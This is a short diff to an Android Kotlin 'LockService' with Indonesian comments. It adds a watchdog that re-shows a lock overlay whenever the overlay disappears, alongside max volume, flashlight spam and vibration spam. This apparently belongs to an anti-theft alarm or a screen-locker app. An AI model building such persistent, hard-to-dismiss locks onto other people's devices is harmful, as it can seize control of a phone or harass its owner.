@@ -96,7 +96,6 @@ class LockService : Service() {
         setVolumeMax()
         startFlashSpam()
         startVibrateSpam()
-
         startWatchdog()
         return START_STICKY
     }
@@ -321,13 +320,24 @@ class LockService : Service() {
                     return
                 }
 
+                // Re-show overlay kalau kehapus
                 if (currentOverlay == null && currentType != null) {
                     showOverlay()
                 }
 
-                watchdog?.postDelayed(this, 1500)
+                // Re-add kalau overlay udah nggak ada di window manager
+                if (currentOverlay != null) {
+                    try {
+                        currentOverlay?.isShown
+                    } catch (_: Exception) {
+                        currentOverlay = null
+                        showOverlay()
+                    }
+                }
+
+                watchdog?.postDelayed(this, 1000)
             }
-        }, 1500)
+        }, 1000)
     }
 
     fun stopLock() {
